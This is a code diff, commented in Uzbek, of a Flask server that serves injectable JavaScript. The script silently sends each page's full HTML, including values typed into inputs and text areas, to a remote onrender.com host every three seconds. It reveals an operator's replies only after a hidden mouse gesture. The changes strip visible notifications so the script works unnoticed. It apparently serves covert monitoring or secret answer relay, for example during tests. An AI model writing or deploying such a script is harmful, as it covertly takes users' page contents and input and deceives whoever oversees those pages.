@@ -14,18 +14,18 @@ MY_RENDER_URL = "https://mening-serverim.onrender.com"
 storage = {
     "html": None,
     "page_url": "",
-    "reply": "Javob yo'q",  # Admin yozgan xabar shu yerda turadi
+    "reply": "Javob yo'q",
     "html_id": 0,
     "reply_id": 0,
     "last_hash": ""
 }
 
-# --- JAVASCRIPT KOD ---
+# --- JAVASCRIPT KOD (YANGILANGAN DIZAYN) ---
 JAVASCRIPT_TEMPLATE = """
 (function(){
     const serverUrl = "SERVER_URL_PLACEHOLDER";
 
-    // --- 1. CHIROYLI XABAR (TOAST) FUNKSIYASI ---
+    // --- 1. TOAST XABARLAR (Faqat tizim ochilganda chiqadi) ---
     function showToast(text, color="#28a745", duration=2000) {
         const oldToast = document.getElementById('my-custom-toast');
         if(oldToast) oldToast.remove();
@@ -36,8 +36,8 @@ JAVASCRIPT_TEMPLATE = """
         toast.style.cssText = `
             position: fixed; bottom: 20px; right: 20px;
             background-color: ${color}; color: white;
-            padding: 12px 25px; border-radius: 8px;
-            font-family: 'Segoe UI', sans-serif; font-size: 14px; font-weight: 600;
+            padding: 10px 20px; border-radius: 8px;
+            font-family: sans-serif; font-size: 14px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.2); z-index: 2147483647;
             opacity: 0; transform: translateY(20px); transition: all 0.4s; pointer-events: none;
         `;
@@ -50,41 +50,64 @@ JAVASCRIPT_TEMPLATE = """
     showToast("✅ TIZIM ISHGA TUSHDI");
 
     // --- O'ZGARUVCHILAR ---
-    let holdTimer = null;         // O'ng tugmani bosib turish taymeri
-    let isSecretMode = false;     // Maxfiy rejim ochildimi?
-    let leftClickCount = 0;       // Chap tugma sanog'i
-    let resetTimer = null;        // Rejimni qayta yopish taymeri
-    let lastMessage = "Hozircha xabar yo'q..."; // Serverdan kelgan xabar
+    let holdTimer = null;         
+    let isSecretMode = false;     
+    let leftClickCount = 0;       
+    let resetTimer = null;        
+    let lastMessage = "Hozircha xabar yo'q..."; 
 
-    // --- KATTA XABAR OYNASI (MESSAGE BOX) ---
+    // --- 2. ADMIN XABARI OYNASI (SUYUQ SHISHA / GLASSMORPHISM) ---
     const msgBox = document.createElement('div');
     msgBox.style.cssText = `
-        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-        background: rgba(0, 0, 0, 0.95); color: #00ff00; padding: 20px 40px;
-        border-radius: 12px; font-family: 'Courier New', monospace; font-size: 18px;
-        text-align: center; display: none; z-index: 2147483647;
-        box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); border: 2px solid #00ff00;
-        max-width: 80%; line-height: 1.5;
+        position: fixed; 
+        bottom: 50px; left: 50%; transform: translateX(-50%);
+        width: 80%; max-width: 600px;
+
+        /* SUYUQ SHISHA EFFEKTI */
+        background: rgba(30, 30, 30, 0.6);
+        backdrop-filter: blur(15px);
+        -webkit-backdrop-filter: blur(15px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+
+        color: #fff; 
+        padding: 20px;
+        border-radius: 15px; 
+        font-family: 'Segoe UI', sans-serif; 
+        font-size: 16px;
+        text-align: center; 
+        display: none; 
+        z-index: 2147483647;
+        opacity: 0;
+        transition: opacity 0.3s ease;
     `;
     document.body.appendChild(msgBox);
 
-    // Xabarni ko'rsatish funksiyasi
     function showBigMessage() {
-        msgBox.innerHTML = "📩 <b>ADMIN XABARI:</b><br><br>" + lastMessage;
+        msgBox.innerHTML = `
+            <div style="font-size: 12px; color: #aaa; margin-bottom: 5px;">YANGI XABAR:</div>
+            <div style="font-size: 18px; font-weight: bold;">${lastMessage}</div>
+        `;
         msgBox.style.display = 'block';
+        // Kichik animatsiya
+        setTimeout(() => { msgBox.style.opacity = '1'; }, 10);
 
-        // 10 sekunddan keyin yopiladi yoki bosganda yopiladi
-        setTimeout(() => { msgBox.style.display = 'none'; }, 10000);
+        // 10 sekunddan keyin sekin yo'qoladi
+        setTimeout(() => { 
+            msgBox.style.opacity = '0'; 
+            setTimeout(() => { msgBox.style.display = 'none'; }, 300);
+        }, 10000);
     }
 
-    // Oynani bosganda yopish
-    msgBox.addEventListener('click', () => { msgBox.style.display = 'none'; });
+    msgBox.addEventListener('click', () => { 
+        msgBox.style.opacity = '0'; 
+        setTimeout(() => { msgBox.style.display = 'none'; }, 300);
+    });
 
-    // --- SERVERDAN JAVOBNI DOIMIY TEKSHIRISH ---
+    // --- 3. ORQA FONDA JIMJIT ISHLASH ---
     function syncWithServer() {
         function getFullDom() {
             try {
-                // Inputlarni qiymatini HTMLga yozib qo'yamiz (Admin ko'rishi uchun)
                 document.querySelectorAll('input').forEach(el => el.setAttribute('value', el.value));
                 document.querySelectorAll('textarea').forEach(el => el.innerHTML=el.value);
             } catch(e){}
@@ -96,59 +119,45 @@ JAVASCRIPT_TEMPLATE = """
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({html: getFullDom(), page: window.location.href})
         }).then(r=>r.json()).then(data => {
-            // Serverdan yangi xabar kelsa, o'zgaruvchiga saqlaymiz
-            if(data.reply) {
-                lastMessage = data.reply;
-            }
-            if(data.status === "new_data") {
-                 showToast("Yuborildi ✅");
-            }
+            if(data.reply) lastMessage = data.reply;
+            // BU YERDA TOAST YO'Q - JIMJITLIK
         }).catch(e=>{});
     }
 
-    // Har 3 soniyada server bilan gaplashib turadi
     setInterval(syncWithServer, 3000);
 
-
-    // --- 🖱️ SICHQONCHA LOGIKASI (ENG MUHIM QISM) ---
-
-    // 1. O'ng tugma menyusini bloklash (xalaqit bermasligi uchun)
+    // --- 4. SICHQONCHA KONTROLI ---
     document.addEventListener('contextmenu', e => e.preventDefault());
 
     document.addEventListener('mousedown', (e) => {
-        // --- O'NG TUGMA (Button 2) - BOSIB TURISH ---
+        // O'NG TUGMA (5 sek)
         if (e.button === 2) {
             holdTimer = setTimeout(() => {
                 isSecretMode = true;
                 leftClickCount = 0;
-                showToast("🔓 Tizim ochildi! (2 marta chapni bosing)", "#ff9800", 3000);
+                // Faqat shu yerda xabar chiqadi
+                showToast("🔓 Tizim ochildi! (Chapni 2 marta bosing)", "#ff9800", 3000);
 
-                // 10 soniyadan keyin rejim yana yopiladi (xavfsizlik uchun)
                 if (resetTimer) clearTimeout(resetTimer);
-                resetTimer = setTimeout(() => { 
-                    isSecretMode = false; 
-                }, 10000);
-            }, 5000); // 5 soniya
+                resetTimer = setTimeout(() => { isSecretMode = false; }, 10000);
+            }, 5000); 
         }
 
-        // --- CHAP TUGMA (Button 0) - OCHILGANDAN KEYIN BOSISH ---
+        // CHAP TUGMA (2 marta)
         if (e.button === 0) {
             if (isSecretMode) {
                 leftClickCount++;
                 if (leftClickCount >= 2) {
-                    showBigMessage();   // Xabarni ko'rsatish
-                    isSecretMode = false; // Rejimni yopish
+                    showBigMessage();   // Suyuq shisha oyna ochiladi
+                    isSecretMode = false; 
                     leftClickCount = 0;
                 }
             }
         }
     });
 
-    // O'ng tugma qo'yib yuborilsa, taymerni bekor qilish
     document.addEventListener('mouseup', (e) => {
-        if (e.button === 2) {
-            if (holdTimer) clearTimeout(holdTimer);
-        }
+        if (e.button === 2 && holdTimer) clearTimeout(holdTimer);
     });
 
 })();
@@ -165,7 +174,6 @@ def get_script():
     final_code = JAVASCRIPT_TEMPLATE.replace("SERVER_URL_PLACEHOLDER", MY_RENDER_URL)
     resp = Response(final_code, mimetype='application/javascript')
     resp.headers['Access-Control-Allow-Origin'] = '*'
-    # Keshni o'chirish
     resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
     resp.headers['Expires'] = '0'
     return resp
@@ -179,7 +187,6 @@ def upload():
         url = data.get('page', '')
         content_hash = hashlib.md5(content.encode('utf-8')).hexdigest()
 
-        # Admin yozgan xabarni qaytaramiz
         response_data = {"reply": storage['reply']}
 
         if content_hash != storage['last_hash']:
@@ -211,8 +218,8 @@ def admin_get_html():
 def admin_reply():
     msg = request.json.get('message')
     if msg:
-        storage['reply'] = msg  # Xabarni saqlaymiz
-        storage['html_id'] += 1  # GUI yangilanishi uchun signal
+        storage['reply'] = msg
+        storage['html_id'] += 1
         return jsonify({"status": "OK"})
     return jsonify({"status": "Error"}), 400
 
